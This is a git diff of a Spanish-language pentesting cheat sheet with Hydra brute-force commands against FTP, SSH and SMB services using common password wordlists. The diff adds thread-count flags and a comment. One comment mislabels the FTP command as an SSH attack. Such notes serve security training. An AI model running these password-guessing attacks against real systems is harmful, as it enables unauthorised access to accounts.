@@ -44,7 +44,7 @@ Esto se usa en el panel del admin de WordPress.
 ```python
 ❯ hydra -l omar -P /usr/share/wordlists/rockyou.txt ftp://❮IP❯ -t 15 # Haremos un ataque de fuerza bruta al puerto SSH, antes de completar el comando con soble TAB podemos ver la lista de diccionarios
 
-❯ hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt ❮IP❯ ftp
+❯ hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt ❮IP❯ ftp -t 4
 
 	# l (ele) = Usuario que en este caso es  'omar'
 	# L = Indicas un archivo que disponga de usuarios 
@@ -55,13 +55,14 @@ Esto se usa en el panel del admin de WordPress.
 ## Hydra fuerza bruta SSH
 
 ```python
-❯ hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt ssh://❮IP❯ 
+❯ hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt ssh://❮IP❯ -t 4
 # Haremos un ataque de fuerza bruta al puerto SSH
 
 	# ssh = Puerto al que vamos a atacar 22
 	# IP = Direccion de la maquina victima
 	# P = Ruta del diccionario o 'archivo que contiene passwds'
 	# L = Ruta del diccionario o 'archivo que contiene users'
+	# t = Lanzar tareas en paralelo al mismo tiempo
 ```
 
 ```python
@@ -77,7 +78,7 @@ Esto se usa en el panel del admin de WordPress.
 	# s = Port y es el puerto al que nos queremos conectar 
 ```
 
-## Hydra fuerza bruta SMB
+## Hydra fuerza bruta SMB / SAMBA
 ```python 
 ❯ hydra -l admin -P /usr/share/wordlists/rockyou.txt smb://<IP>        # Fuerza bruta al usuario en el servidor SMB
 ❯ hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> smb
